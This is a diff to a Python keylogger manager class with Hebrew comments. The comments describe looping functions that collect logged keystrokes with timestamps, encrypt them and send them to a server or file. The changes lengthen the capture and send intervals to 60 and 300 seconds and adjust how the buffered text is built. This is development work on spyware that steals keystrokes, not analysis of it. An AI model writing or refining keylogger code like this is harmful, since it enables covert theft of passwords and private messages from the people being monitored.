@@ -29,7 +29,7 @@ class KeyloggerManager:
 
     def get_update(self):                    # פונקציה הרצה בלולאה אין סופית כל פסק זמן, מקבלת את הנתונים מהמאזין ומאחסנת אותם זמנית עם חותמת זמן
         while True:
-            time.sleep(5)
+            time.sleep(60)
             recent = self.keylogger_listener.get_logged_keys()
             cur_time = datetime.now().strftime("%d/%m/%y_%H:%M")
             if self.copied:
@@ -43,7 +43,7 @@ class KeyloggerManager:
 
     def send_data(self):                    # פונקציה הרצה בלןלאה אין סופית כל פסק זמן, ממירה את האחסון לstr מצפינה אותו ושולחת לשרת/קובץ
         while True:
-            time.sleep(5)
+            time.sleep(300)
             if self.buffer:
                 dic2 = self.buffer.copy()
                 self.copied = True
@@ -52,7 +52,7 @@ class KeyloggerManager:
                     text += f"{k}:\n"
                     for w in v:
                         text += w
-                        text += "\n"
+                    text += "\n"
                 try:
                     encrypting_text = Encryption(text,self.key)
                     encrypted_text = encrypting_text.encrypt_text()
